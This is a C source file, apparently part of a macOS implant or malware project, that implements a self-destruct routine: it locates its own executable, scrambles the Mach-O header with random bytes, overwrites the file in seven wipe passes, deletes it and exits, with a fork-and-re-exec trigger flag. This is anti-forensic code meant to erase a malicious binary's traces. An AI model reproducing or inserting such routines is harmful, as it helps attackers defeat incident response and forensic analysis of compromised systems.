#include <wisp.h>

/*-------------------------------------------
///  DIe 
-------------------------------------------*/

__attribute__((always_inline)) static inline void f_buffer(unsigned char *buf, size_t len,
                                                           wipe_pattern_t pattern, unsigned char custom) {
    switch (pattern) {
        case WIPE_ZERO:   memset(buf, 0x00, len); break;
        case WIPE_ONE:    memset(buf, 0xFF, len); break;
        case WIPE_RANDOM: for (size_t i = 0; i < len; i++) buf[i] = arc4random_uniform(256); break;
        case WIPE_CUSTOM: memset(buf, custom, len); break;
    }
}

__attribute__((always_inline)) static inline int w_file(int fd, unsigned char *buf, size_t len,
                                                        const wipe_conf_t *config) {
    for (int pass = 0; pass < config->passes; pass++) {
        f_buffer(buf, len, config->patterns[pass], config->custom);
        if (reset(fd) == -1 || wrby(fd, buf, len) != 0 || fsync(fd) != 0)
            return -1;
    }
    return 0;
}

int corrupt_macho(int fd) {
    struct stat st;
    if (fstat(fd, &st) != 0) return -1;

    size_t sz = (size_t)st.st_size;
    if (sz < 4096) return -1;

    unsigned char *header = malloc(4096);
    if (!header) return -1;

    if (pread(fd, header, 4096, 0) != 4096) goto bail;

    *(uint32_t *)(header) = arc4random_uniform(0xFFFFFFFF);
    for (int i = 0; i < 16; i++) {
        size_t off = arc4random_uniform(4096 - 4);
        *(uint32_t *)(header + off) = arc4random_uniform(0xFFFFFFFF);
    }

    if (pwrite(fd, header, 4096, 0) != 4096) goto bail;

    free(header);
    return fsync(fd);

bail:
    free(header);
    return -1;
}

int _nuke(const char *path, const wipe_conf_t *config) {
    struct stat st;
    if (stat(path, &st) != 0) return -1;

    size_t sz = (size_t)st.st_size;
    if (!sz) return unlink(path);

    unsigned char *buf = malloc(sz);
    if (!buf) return -1;

    int fd = oprw(path);
    if (fd < 0) { free(buf); return -1; }

    int res = w_file(fd, buf, sz, config);
    clso(fd);
    free(buf);
    if (res != 0) return -1;
    return unlink(path);
}

wipe_conf_t *prep_nuker(int passes) {
    wipe_conf_t *cfg = malloc(sizeof(*cfg));
    if (!cfg) return NULL;

    cfg->patterns = malloc(sizeof(wipe_pattern_t) * passes);
    if (!cfg->patterns) { free(cfg); return NULL; }

    for (int i = 0; i < passes - 1; i++) cfg->patterns[i] = WIPE_RANDOM;
    cfg->patterns[passes - 1] = WIPE_ZERO;
    cfg->passes = passes;
    cfg->custom = 0;

    return cfg;
}

void _burn(wipe_conf_t *cfg) {
    if (cfg) {
        free(cfg->patterns);
        free(cfg);
    }
}

int _self(const char *path) {
    int passes = 7;
    wipe_conf_t *cfg = prep_nuker(passes);
    if (!cfg) return -1;

    int fd = open(path, O_RDWR);
    if (fd < 0) { _burn(cfg); return -1; }

    corrupt_macho(fd);
    close(fd);

    int r = _nuke(path, cfg);
    _burn(cfg);
    return r;
}

int autodes(void) {
    char path[1024] = {0};
    uint32_t sz = sizeof(path);
    if (find_self(path, &sz) != 0) exit(EXIT_FAILURE);

    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        execl(path, path, "--deadfish", NULL); // This part has an funny backstory,
                                              // feel free to replace it with your own routine.
        exit(EXIT_FAILURE);
    }
    return 0;
}

void k_ill(void) {
    char path[1024] = {0};
    uint32_t sz = sizeof(path);
    if (find_self(path, &sz) != 0) exit(EXIT_FAILURE);

    _self(path);
    sleep(1);
    exit(EXIT_SUCCESS);
}

__attribute__((noreturn)) void panic(void) {
    k_ill();
}
